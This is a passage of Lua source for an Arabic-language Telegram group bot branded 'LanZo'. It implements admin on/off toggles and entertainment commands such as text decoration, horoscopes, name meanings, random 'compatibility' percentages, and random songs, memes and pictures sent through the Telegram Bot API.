if text and text:match("^زخرفه (.*)$") and ChCheck(msg) or text and text:match("^زخرف (.*)$") and ChCheck(msg) then 
local TextZrf = text:match("^زخرفه (.*)$") or text:match("^زخرف (.*)$") 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZrf)) 
Zrf = JSON.decode(UrlZrf) 
t = "᥀︙قائمة الزخرفه ↫ ⤈\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_aMeR(msg.chat_id_, msg.id_, 1, t, 1, 'md')
end
end
--     Source LanZo     --
if text == "تفعيل الابراج" and Manager(msg) and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل الابراج بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Brg:aMeR'..msg.chat_id_) 
end
if text == "تعطيل الابراج" and Manager(msg) and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل الابراج بنجاح'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Brg:aMeR'..msg.chat_id_,true)  
end
if not DevaMeR:get(LanZo..'aMeR:Brg:aMeR'..msg.chat_id_) then
if text and text:match("^برج (.*)$") and ChCheck(msg) or text and text:match("^برجي (.*)$") and ChCheck(msg) then 
local TextBrg = text:match("^برج (.*)$") or text:match("^برجي (.*)$") 
UrlBrg = https.request('https://apiabs.ml/brg.php?brg='..URL.escape(TextBrg)) 
Brg = JSON.decode(UrlBrg) 
t = Brg.ok.abs  
Dev_aMeR(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source LanZo     --
if text and (text == "تفعيل اوامر النسب" or text == "تفعيل نسبه الحب" or text == "تفعيل نسبه الكره" or text == "تفعيل نسبه الرجوله" or text == "تفعيل نسبه الانوثه" or text == "تفعيل نسبه الغباء") and Manager(msg) and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل اوامر النسب'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Nsba:aMeR'..msg.chat_id_) 
end
if text and (text == "تعطيل اوامر النسب" or text == "تعطيل نسبه الحب" or text == "تعطيل نسبه الكره" or text == "تعطيل نسبه الرجوله" or text == "تعطيل نسبه الانوثه" or text == "تعطيل نسبه الغباء") and Manager(msg) and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل اوامر النسب'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Nsba:aMeR'..msg.chat_id_,true)  
end
if not DevaMeR:get(LanZo..'aMeR:Nsba:aMeR'..msg.chat_id_) then
if text == "نسبه الحب" and ChCheck(msg) or text == "نسبة الحب" and ChCheck(msg) then
DevaMeR:set(LanZo..'LoveNsba:aMeR'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الحب بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and DevaMeR:get(LanZo..'LoveNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الحب ', 1, 'md')
DevaMeR:del(LanZo..'LoveNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
aMeR = math.random(0,100);
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙نسبة الحب بين '..text..' هي : '..aMeR..'%', 1, 'md')
DevaMeR:del(LanZo..'LoveNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevaMeR:get(LanZo..'aMeR:Nsba:aMeR'..msg.chat_id_) then
if text == "نسبه الخيانه" and ChCheck(msg) or text == "نسبة الخيانه" and ChCheck(msg) or text == "↫ نسبه الخيانه ᥀" and ChCheck(msg) then
DevaMeR:set(LanZo..'RyNsba:aMeR'..msg.chat_id_..msg.sender_user_id_,true)
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الخيانه بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الخيانه" and text ~= "نسبة الخيانه" and text ~= "↫ نسبه الخيانه ᥀" and DevaMeR:get(LanZo..'RyNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الخيانه ', 1, 'md')
DevaMeR:del(LanZo..'RyNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
aMeR = math.random(0,100);
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙نسبة الخيانه بين '..text..' هي : '..aMeR..'%', 1, 'md')
DevaMeR:del(LanZo..'RyNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevaMeR:get(LanZo..'aMeR:Nsba:aMeR'..msg.chat_id_) then
if text and (text == "نسبه الجمال" or text == "نسبة الجمال" or text == "↫ نسبه الجمال ᥀") and ChCheck(msg) then
DevaMeR:set(LanZo..'JNsba:aMeR'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة جماله كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الجمال" and text ~= "نسبة الجمال" and text ~= "↫ نسبه الجمال ᥀" and DevaMeR:get(LanZo..'JNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الجمال ', 1, 'md')
DevaMeR:del(LanZo..'JNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
aMeR = math.random(0,100);
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙نسبة جمال '..text..' هي : '..aMeR..'%', 1, 'md')
DevaMeR:del(LanZo..'JNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevaMeR:get(LanZo..'aMeR:Nsba:aMeR'..msg.chat_id_) then
if text == "نسبه الكره" and ChCheck(msg) or text == "نسبة الكره" and ChCheck(msg) or text == "↫ نسبه الكره ᥀" and ChCheck(msg) then
DevaMeR:set(LanZo..'HataNsba:aMeR'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسمين لحساب نسبة الكره بينهما كمثال ↫ جاك و روز', 1, 'md')
end
end
if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and text ~= "↫ نسبه الكره ᥀" and DevaMeR:get(LanZo..'HataNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الكره ', 1, 'md')
DevaMeR:del(LanZo..'HataNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
aMeR = math.random(0,100);
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙نسبة الكره بين '..text..' هي : '..aMeR..'%', 1, 'md')
DevaMeR:del(LanZo..'HataNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevaMeR:get(LanZo..'aMeR:Nsba:aMeR'..msg.chat_id_) then
if text and (text == "نسبه الرجوله" or text == "نسبة الرجوله" or text == "نسبه رجوله" or text == "نسبة رجوله" or text == "↫ نسبه الرجوله ᥀") and ChCheck(msg) then
DevaMeR:set(LanZo..'RjolaNsba:aMeR'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة رجولته كمثال ↫ جاك', 1, 'md')
end
end
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and text ~= "↫ نسبه الرجوله ᥀" and DevaMeR:get(LanZo..'RjolaNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الرجوله ', 1, 'md')
DevaMeR:del(LanZo..'RjolaNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
aMeR = math.random(0,100);
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙نسبة رجولة '..text..' هي : '..aMeR..'%', 1, 'md')
DevaMeR:del(LanZo..'RjolaNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevaMeR:get(LanZo..'aMeR:Nsba:aMeR'..msg.chat_id_) then
if text and (text == "نسبه الانوثه" or text == "نسبة الانوثه" or text == "نسبه انوثه" or text == "نسبة انوثه" or text == "↫ نسبه الانوثه ᥀") and ChCheck(msg) then
DevaMeR:set(LanZo..'AnothaNsba:aMeR'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة انوثته كمثال ↫ روز', 1, 'md')
end
end
if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and text ~= "↫ نسبه الانوثه ᥀" and DevaMeR:get(LanZo..'AnothaNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الانوثه ', 1, 'md')
DevaMeR:del(LanZo..'AnothaNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
aMeR = math.random(0,100);
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙نسبة انوثة '..text..' هي : '..aMeR..'%', 1, 'md')
DevaMeR:del(LanZo..'AnothaNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevaMeR:get(LanZo..'aMeR:Nsba:aMeR'..msg.chat_id_) then
if text and (text == "نسبه الغباء" or text == "نسبة الغباء" or text == "↫ نسبه الغباء ᥀") and ChCheck(msg) then
DevaMeR:set(LanZo..'StupidNsba:aMeR'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙قم بارسل اسم الشخص لقياس نسبة غبائه كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and text ~= "↫ نسبه الغباء ᥀" and DevaMeR:get(LanZo..'StupidNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء امر نسبة الغباء ', 1, 'md')
DevaMeR:del(LanZo..'StupidNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
aMeR = math.random(0,100);
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙نسبة غباء '..text..' هي : '..aMeR..'%', 1, 'md')
DevaMeR:del(LanZo..'StupidNsba:aMeR'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
--     Source LanZo     --
if text == "تفعيل حساب العمر" and Manager(msg) and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل حساب العمر'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Age:aMeR'..msg.chat_id_) 
end
if text == "تعطيل حساب العمر" and Manager(msg) and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل حساب العمر'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Age:aMeR'..msg.chat_id_,true)  
end
if not DevaMeR:get(LanZo..'aMeR:Age:aMeR'..msg.chat_id_) then
if text and text:match("^احسب (.*)$") and ChCheck(msg) or text and text:match("^عمري (.*)$") and ChCheck(msg) then 
local TextAge = text:match("^احسب (.*)$") or text:match("^عمري (.*)$") 
UrlAge = https.request('https://apiabs.ml/age.php?age='..URL.escape(TextAge)) 
Age = JSON.decode(UrlAge) 
t = Age.ok.abs
Dev_aMeR(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source LanZo     --
if text == "تفعيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل معاني الاسماء'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Mean:aMeR'..msg.chat_id_) 
end
if text == "تعطيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل معاني الاسماء'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Mean:aMeR'..msg.chat_id_,true)  
end
if not DevaMeR:get(LanZo..'aMeR:Mean:aMeR'..msg.chat_id_) then
if text and text:match("^معنى الاسم (.*)$") and SourceCh(msg) or text and text:match("^معنى اسم (.*)$") and SourceCh(msg) then 
local TextMean = text:match("^معنى الاسم (.*)$") or text:match("^معنى اسم (.*)$") 
UrlMean = https.request('https://apiabs.ml/Mean.php?Abs='..URL.escape(TextMean)) 
Mean = JSON.decode(UrlMean) 
t = Mean.ok.abs
Dev_aMeR(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source LanZo     --
if text == "تفعيل متحركه" and Manager(msg) and SourceCh(msg) or text == "تفعيل المتحركه" and Manager(msg) and SourceCh(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل المتحركه'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:gif:aMeR'..msg.chat_id_) 
end
if text == "تعطيل متحركه" and Manager(msg) and SourceCh(msg) or text == "تعطيل المتحركه" and Manager(msg) and SourceCh(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل المتحركه'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:gif:aMeR'..msg.chat_id_,true)  
end
if text and (text == "متحركه" or text == "↫ متحركه ᥀") and not DevaMeR:get(LanZo..'aMeR:gif:aMeR'..msg.chat_id_) and SourceCh(msg) then
aMeR = math.random(2,1075); 
local Text ='*᥀︙تم اختيار المتحركه لك*'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '᥀ LanZo Team .',url="t.me/Bw5Bw"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/GifLanZo/'..aMeR..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source LanZo     --
if text == "تفعيل ميمز" and Manager(msg) and SourceCh(msg) or text == "تفعيل الميمز" and Manager(msg) and SourceCh(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل الميمز'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:memz:aMeR'..msg.chat_id_) 
end
if text == "تعطيل ميمز" and Manager(msg) and SourceCh(msg) or text == "تعطيل الميمز" and Manager(msg) and SourceCh(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل الميمز'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:memz:aMeR'..msg.chat_id_,true)  
end
if text and (text == "ميمز" or text == "↫ ميمز ᥀") and not DevaMeR:get(LanZo..'aMeR:memz:aMeR'..msg.chat_id_) and SourceCh(msg) then
aMeR = math.random(2,1201); 
local Text ='*᥀︙تم اختيار مقطع الميمز لك*'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '᥀ LanZo Team .',url="t.me/Bw5Bw"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/MemzLanZo/'..aMeR..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source LanZo     --
if text == "تفعيل غنيلي" and Manager(msg) and SourceCh(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل غنيلي'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Audios:aMeR'..msg.chat_id_) 
end
if text == "تعطيل غنيلي" and Manager(msg) and SourceCh(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل غنيلي'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Audios:aMeR'..msg.chat_id_,true)  
end
if text and (text == "غنيلي" or text == "↫ غنيلي ᥀") and not DevaMeR:get(LanZo..'aMeR:Audios:aMeR'..msg.chat_id_) and SourceCh(msg) then
aMeR = math.random(4,2824); 
local Text ='*᥀︙تم اختيار المقطع الصوتي لك*'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '᥀ LanZo Team .',url="t.me/Bw5Bw"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/AudiosLanZo/'..aMeR..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source LanZo     --
if text == "تفعيل الاغاني" and Manager(msg) and SourceCh(msg) or text == "تفعيل اغنيه" and Manager(msg) and SourceCh(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل الاغاني'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:mp3:aMeR'..msg.chat_id_) 
end
if text == "تعطيل الاغاني" and Manager(msg) and SourceCh(msg) or text == "تعطيل اغنيه" and Manager(msg) and SourceCh(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل الاغاني'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:mp3:aMeR'..msg.chat_id_,true)  
end
if text and (text == "اغنيه" or text == "↫ اغنيه ᥀" or text == "اغاني") and not DevaMeR:get(LanZo..'aMeR:mp3:aMeR'..msg.chat_id_) and SourceCh(msg) then
aMeR = math.random(2,1167); 
local Text ='*᥀︙تم اختيار الاغنيه لك*'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '᥀ LanZo Team .',url="t.me/Bw5Bw"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/LanZoMp3/'..aMeR..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source LanZo     --
if text == "تفعيل ريمكس" and Manager(msg) and SourceCh(msg) or text == "تفعيل الريمكس" and Manager(msg) and SourceCh(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل الريمكس'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Remix:aMeR'..msg.chat_id_) 
end
if text == "تعطيل ريمكس" and Manager(msg) and SourceCh(msg) or text == "تعطيل الريمكس" and Manager(msg) and SourceCh(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل الريمكس'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Remix:aMeR'..msg.chat_id_,true)  
end
if text and (text == "ريمكس" or text == "↫ ريمكس ᥀") and not DevaMeR:get(LanZo..'aMeR:Remix:aMeR'..msg.chat_id_) and SourceCh(msg) then
aMeR = math.random(2,612); 
local Text ='*᥀︙تم اختيار الريمكس لك*'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '᥀ LanZo Team .',url="t.me/Bw5Bw"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. msg.chat_id_ .. '&voice=https://t.me/RemixLanZo/'..aMeR..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source LanZo     --
if text == "تفعيل صوره" and Manager(msg) and SourceCh(msg) or text == "تفعيل الصوره" and Manager(msg) and SourceCh(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل الصوره'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Photo:aMeR'..msg.chat_id_) 
end
if text == "تعطيل صوره" and Manager(msg) and SourceCh(msg) or text == "تعطيل الصوره" and Manager(msg) and SourceCh(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل الصوره'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Photo:aMeR'..msg.chat_id_,true)  
end
if text and (text == "صوره" or text == "↫ صوره ᥀") and not DevaMeR:get(LanZo..'aMeR:Photo:aMeR'..msg.chat_id_) and SourceCh(msg) then
aMeR = math.random(4,1171); 
local Text ='*᥀︙تم اختيار الصوره لك*'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '᥀ LanZo Team .',url="t.me/Bw5Bw"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/PhotosLanZo/'..aMeR..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source LanZo     --
if text == "تفعيل انمي" and Manager(msg) and SourceCh(msg) or text == "تفعيل الانمي" and Manager(msg) and SourceCh(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل الانمي'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Anime:aMeR'..msg.chat_id_) 
end
if text == "تعطيل انمي" and Manager(msg) and SourceCh(msg) or text == "تعطيل الانمي" and Manager(msg) and SourceCh(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل الانمي'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Anime:aMeR'..msg.chat_id_,true)  
end
if text and (text == "انمي" or text == "↫ انمي ᥀") and not DevaMeR:get(LanZo..'aMeR:Anime:aMeR'..msg.chat_id_) and SourceCh(msg) then
aMeR = math.random(3,1002); 
local Text ='*᥀︙تم اختيار صورة الانمي لك*'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '᥀ LanZo Team .',url="t.me/Bw5Bw"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/AnimeLanZo/'..aMeR..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source LanZo     --
if text == "تفعيل فلم" and Manager(msg) and SourceCh(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل الافلام'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Movies:aMeR'..msg.chat_id_) 
end
if text == "تعطيل فلم" and Manager(msg) and SourceCh(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل الافلام'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Movies:aMeR'..msg.chat_id_,true)  
end
if text and (text == "فلم" or text == "↫ فلم ᥀") and not DevaMeR:get(LanZo..'aMeR:Movies:aMeR'..msg.chat_id_) and ChCheck(msg) then
aMeR = math.random(45,125); 
local Text ='*᥀︙تم اختيار الفلم لك*'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '᥀ LanZo Team .',url="t.me/Bw5Bw"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/MoviesLanZo/'..aMeR..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source LanZo     --
if text == "تفعيل مسلسل" and Manager(msg) and SourceCh(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل المسلسلات'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:Series:aMeR'..msg.chat_id_) 
end
if text == "تعطيل مسلسل" and Manager(msg) and SourceCh(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل المسلسلات'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:Series:aMeR'..msg.chat_id_,true)  
end
if text and (text == "مسلسل" or text == "↫ مسلسل ᥀") and not DevaMeR:get(LanZo..'aMeR:Series:aMeR'..msg.chat_id_) and SourceCh(msg) then
aMeR = math.random(2,54); 
local Text ='*᥀︙تم اختيار المسلسل لك*'
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '᥀ LanZo Team .',url="t.me/Bw5Bw"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SeriesLanZo/'..aMeR..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     Source LanZo     --
if Admin(msg) then
if DevaMeR:get(LanZo..'aMeR:LockSettings'..msg.chat_id_) then 
